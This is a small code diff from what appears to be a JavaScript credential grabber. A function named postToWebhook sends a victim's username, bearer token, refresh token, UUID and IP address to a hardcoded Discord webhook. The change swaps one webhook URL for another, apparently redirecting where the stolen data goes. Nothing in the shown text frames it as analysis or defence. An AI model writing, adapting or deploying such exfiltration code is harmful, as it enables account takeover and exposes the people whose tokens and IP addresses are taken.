@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
     axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1035739384525365249/znx8rkzuOMqWkPrt2JDOL1xmMbIpM-g-36akxGoEEMohhSj1blZINPbn9k2afyHdL5tW", data)
+        axios.post("https://discord.com/api/webhooks/1231175751844237392/H2OmObsFGXfP9aurncKhTPQiX4xND-qXIiQcu010cBbPHyy0jTUJwqiQwrdaXfBqZKA2", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])
     
